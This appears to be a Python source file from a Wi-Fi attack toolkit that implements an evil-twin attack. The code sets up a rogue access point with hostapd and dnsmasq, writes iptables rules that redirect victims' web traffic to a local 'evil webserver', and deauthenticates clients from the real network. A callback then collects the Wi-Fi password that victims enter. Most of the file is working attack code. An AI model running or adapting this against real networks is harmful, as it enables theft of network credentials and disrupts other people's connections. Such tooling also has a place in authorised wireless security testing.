#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

import time

from ..model.attack import Attack
from ..tools.airodump import Airodump
from ..tools.dnsmasq import Dnsmasq
from ..tools.hostapd import Hostapd
from ..tools.ifconfig import Ifconfig
from ..tools.iptables import Iptables
from ..tools.eviltwin_server import EviltwinServer
from ..util.color import Color
from ..util.deauther import Deauther
from ..config import Configuration

class EvilTwinAttack(Attack):
    '''
    Monitor-mode card should be used for deauthing (packet injection).
    Other card can be put into AP mode.
    '''

    def __init__(self, target, deauth_iface, ap_iface):
        super(EvilTwinAttack, self).__init__(target)

        # Args
        self.target = target
        self.deauth_iface = deauth_iface
        self.ap_iface = ap_iface

        # State
        self.success = False
        self.completed = False
        self.crack_result = None
        self.error_msg = None

        # Processes
        self.hostapd = None
        self.dnsmasq = None
        self.webserver = None
        self.deauther = None


    def run(self):
        #raise Exception('Eviltwin attack not implemented yet, see https://github.com/derv82/wifite2/issues/81')

        # Start airodump on deuath iface, wait for target, etc.
        try:

            with Airodump(channel=self.target.channel,
                          target_bssid=self.target.bssid,
                          skip_wps=True, # Don't check for WPS-compatibility
                          output_file_prefix='airodump') as airodump:
                Color.clear_line()
                Color.p('\r{+} {O}waiting{W} for target to appear...')
                airodump_target = self.wait_for_target(airodump)
                Color.clear_entire_line()

                self.pattack(airodump_target, 'setting up {C}%s{W}' % self.ap_iface)
                Ifconfig.up(self.ap_iface, ['10.0.0.1/24'])
                Color.clear_entire_line()

                self.pattack(airodump_target, 'configuring {C}iptables{W}')
                self.configure_iptables(self.ap_iface)
                Color.clear_entire_line()

                self.pattack(airodump_target, 'enabling {C}port forwarding{W}')
                self.set_port_forwarding(enabled=True)
                Color.clear_entire_line()

                self.pattack(airodump_target, 'starting {C}hostapd{W} on {C}%s{W}' % self.ap_iface)
                self.hostapd = Hostapd(self.target, self.ap_iface)
                self.hostapd.start()
                Color.clear_entire_line()

                self.pattack(airodump_target, 'starting {C}dnsmasq{W} on {C}%s{W}' % self.ap_iface)
                self.dnsmasq = Dnsmasq(self.ap_iface)
                self.dnsmasq.start()
                Color.clear_entire_line()

                self.pattack(airodump_target, 'starting {C}evil webserver{W}...')
                self.webserver = EviltwinServer(self.success_callback, self.error_callback)
                self.webserver.start()
                Color.clear_entire_line()

                self.pattack(airodump_target, 'starting {C}deauther{W}...')
                self.deauther = Deauther(self.deauth_iface, self.target)
                #self.deauther.start()
                Color.clear_entire_line()

                while not self.completed:
                    time.sleep(1)
                    airodump_target = self.wait_for_target(airodump)

                    # TODO: Check hostapd, dnsmasq, and webserver statistics
                    self.pattack(airodump_target, 'waiting for clients')

                    # Update deauther with latest client information
                    self.deauther.update_target(airodump_target)

        except KeyboardInterrupt:
            # Cleanup
            Color.pl('\n{!} {O}Interrupted{W}')

        if self.success:
            # TODO: print status & save
            self.cleanup()
            return

        if self.error_msg:
            self.cleanup()
            raise Exception(self.error_msg)

        self.cleanup()


    def pattack(self, airodump_target, status):
        Color.pattack('EvilTwin', airodump_target, 'attack', status)


    def success_callback(self, crack_result):
        # Called by webserver when we get a password
        self.crack_result = crack_result
        self.success = True
        self.completed = True


    def status_callback(self, status_message):
        # Called by webserver on status update
        pass


    def error_callback(self, error_msg):
        # Called by webserver on error / failure
        self.completed = True
        self.error_msg = error_msg


    def cleanup(self):
        if self.dnsmasq:
            self.dnsmasq.stop()

        if self.hostapd:
            self.hostapd.stop()

        if self.webserver:
            self.webserver.stop()
            # From https://stackoverflow.com/a/268686

        if self.deauther:
            self.deauther.stop()

        self.set_port_forwarding(enabled=False)

        Iptables.flush() #iptables -F
        Iptables.flush(table='nat') #iptables -t nat -F
        Iptables.flush(table='mangle') #iptables -t mangle -F

        Iptables.delete_chain() #iptables -X
        Iptables.delete_chain(table='nat') #iptables -t nat -X
        Iptables.delete_chain(table='mangle') #iptables -t mangle -X


    def set_port_forwarding(self, enabled=True):
        # echo "1" > /proc/sys/net/ipv4/ip_forward
        # TODO: Are there other/better ways to do this?
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ip_forward:
            ip_forward.write('1' if enabled else '0')


    def configure_iptables(self, interface):
        # iptables -N internet -t mangle
        Iptables.new_chain('internet', 'mangle')

        #iptables -t mangle -A PREROUTING -j internet
        Iptables.append('PREROUTING', table='mangle', rules=[
            '-j', 'internet'
        ])

        #iptables -t mangle -A internet -j MARK --set-mark 99
        Iptables.append('PREROUTING', table='mangle', rules=[
            '-j', 'MARK',
            '--set-mark', '99',
        ])

        #iptables -t nat -A PREROUTING -m mark --mark 99 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1
        Iptables.append('PREROUTING', table='nat', rules=[
            '--match', 'mark',
            '--mark', '99',
            '--protocol', 'tcp',
            '--dport', '80',
            '--jump', 'DNAT',
            '--to-destination', '10.0.0.1',
        ])

        #iptables -A FORWARD -i eth0 -o wlan0 -m state --state ESTABLISHED,RELATED -j ACCEPT
        Iptables.append('FORWARD', rules=[
            '--in-interface', 'eth0',
            '--out-interface', interface,
            '--match', 'state',
            '--state', 'ESTABLISHED,RELATED',
            '--jump', 'ACCEPT',
        ])

        #iptables -A FORWARD -m mark --mark 99 -j REJECT
        Iptables.append('FORWARD', rules=[
            '--match', 'mark',
            '--mark', '99',
            '--jump', 'REJECT',
        ])

        #iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
        Iptables.append('FORWARD', rules=[
            '--in-interface', interface,
            '--out-interface', 'eth0',
            '--jump', 'ACCEPT',
        ])

        #iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
        Iptables.append('POSTROUTING', table='nat', rules=[
            '--out-interface', 'eth0',
            '--jump', 'MASQUERADE',
        ])

